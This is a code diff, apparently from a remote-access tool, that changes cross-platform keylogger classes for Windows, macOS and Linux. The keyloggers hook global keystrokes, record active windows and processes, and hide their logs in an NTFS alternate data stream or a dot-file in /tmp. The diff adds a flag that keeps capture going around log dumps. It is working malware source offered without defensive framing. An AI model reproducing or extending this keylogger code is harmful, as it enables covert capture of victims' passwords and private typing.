@@ -548,18 +548,21 @@ import threading
 import subprocess
 from ctypes import *
 import win32clipboard
+import tempfile
 
 class keylogger():
 
     def __init__(self):
         self.kl_status = False
+        self.kl_lognow_status = False
         self.frz_status = False
         self.active_window = ''
-        self.log_file = 'C:\\Windows\\Temp\\tmp:stkl.log'
+        self.log_file = tempfile.gettempdir() + ':stkl.log'
 
     def start(self):
         kl_summary = ''
         self.kl_status= True
+        self.kl_lognow_status = True
         now = datetime.datetime.now()
         start_time=now.strftime("%Y-%m-%d %H:%M:%S")
         kl_summary = "\\n[ {} ] - Keylogger is now running".format(start_time)
@@ -599,7 +602,7 @@ class keylogger():
         kl_summary = "\\n\\n"
         kl_summary += proc_info
         kl_summary += "\\n"
-        if self.kl_status:
+        if self.kl_lognow_status and self.kl_status:
             self.log_handle.write(kl_summary)
 
         # close handles
@@ -608,7 +611,7 @@ class keylogger():
 
     def KeyStroke(self,event):
         kl_summary = ''
-        if self.kl_status:
+        if self.kl_status and self.kl_lognow_status:
             if event.WindowName != self.active_window:
                 self.active_window = event.WindowName
                 self.get_active_win()
@@ -638,7 +641,8 @@ class keylogger():
 
     def run(self):
         kl_summary = ''
-        self.kl_status= True
+        self.kl_status = True
+        self.kl_lognow_status = True
         self.key_count = 0
         self.kl = pyHook.HookManager()
         self.psapi = ctypes.windll.psapi
@@ -680,6 +684,7 @@ class keylogger():
             freezer.__del__()
 
     def stop(self):
+        self.kl_lognow_status = False
         self.kl_status = False
 
     def stop_freeze(self):
@@ -701,11 +706,12 @@ class keylogger():
 
     def get_dump(self):
         if self.get_status():
-            self.kl_status = False
+            self.kl_lognow_status = False
             self.log_handle.close()
-            resp=self.dump_logs()
+            resp = self.dump_logs()
+
             self.log_handle = open(self.log_file,'w')
-            self.kl_status = True
+            self.kl_lognow_status = True
             self.active_window = ''
             self.key_count = 0
         else:
@@ -742,12 +748,13 @@ class keylogger():
     def __init__(self):
         self.log_file = '/tmp/.stkl.log'
         self.kl_status = False
+        self.kl_lognow_status = False
         mask = NSKeyDownMask
         self.st_monitor = NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask,self.KeyStroke)
         self.active_window = ''
 
     def KeyStroke(self,event):
-        if self.kl_status:
+        if self.kl_status and self.kl_lognow_status:
             try:
                 self.check_active_win()
                 self.key_count += 1
@@ -771,6 +778,7 @@ class keylogger():
     def start(self):
         self.log_handle = open(self.log_file,'a')
         self.kl_status = True
+        self.kl_lognow_status = True
         self.key_count = 0
         now = datetime.datetime.now()
         start_time=now.strftime("%Y-%m-%d %H:%M:%S")
@@ -779,6 +787,7 @@ class keylogger():
 
     def stop(self):
         self.kl_status = False
+        self.kl_lognow_status = False
         now = datetime.datetime.now()
         end_time=now.strftime("%Y-%m-%d %H:%M:%S")
         kl_summary = "\\n\\n[ {} ] - Keylogger has been stopped\\n".format(end_time)
@@ -800,11 +809,11 @@ class keylogger():
 
     def get_dump(self):
         if self.get_status():
-            self.kl_status = False
+            self.kl_lognow_status = False
             self.log_handle.close()
-            resp=self.dump_logs()
+            resp = self.dump_logs()
             self.log_handle = open(self.log_file,'w')
-            self.kl_status = True
+            self.kl_lognow_status = True
             self.active_window = ''
             self.key_count = 0
         else:
@@ -830,6 +839,7 @@ class keylogger():
 
     def __init__(self):
         self.kl_status = False
+        self.kl_lognow_status = False
         self.active_window = ''
         self.active_proc = ''
         self.log_file = '/tmp/.stkl.log'
@@ -837,6 +847,7 @@ class keylogger():
     def start(self):
         self.log_handle = open(self.log_file,'a')
         self.kl_status = True
+        self.kl_lognow_status = True
         self.key_count = 0
         now = datetime.datetime.now()
         start_time=now.strftime("%Y-%m-%d %H:%M:%S")
@@ -852,7 +863,7 @@ class keylogger():
         self.kl_hook.start()
 
     def KeyStroke(self,event):
-        if self.kl_status:
+        if self.kl_status and self.kl_lognow_status:
             kl_summary = ''
             self.check_active_win(event.WindowName, event.WindowProcName)
             if self.key_count > 75:
@@ -876,6 +887,7 @@ class keylogger():
 
     def stop(self):
         self.kl_status = False
+        self.kl_lognow_status = False
         self.kl_hook.cancel()
         now = datetime.datetime.now()
         end_time=now.strftime("%Y-%m-%d %H:%M:%S")
@@ -896,11 +908,11 @@ class keylogger():
 
     def get_dump(self):
         if self.get_status():
-            self.kl_status = False
+            self.kl_lognow_status = False
             self.log_handle.close()
-            resp=self.dump_logs()
+            resp = self.dump_logs()
             self.log_handle = open(self.log_file,'w')
-            self.kl_status = True
+            self.kl_lognow_status = True
             self.active_window = ''
             self.active_proc = ''
             self.key_count = 0
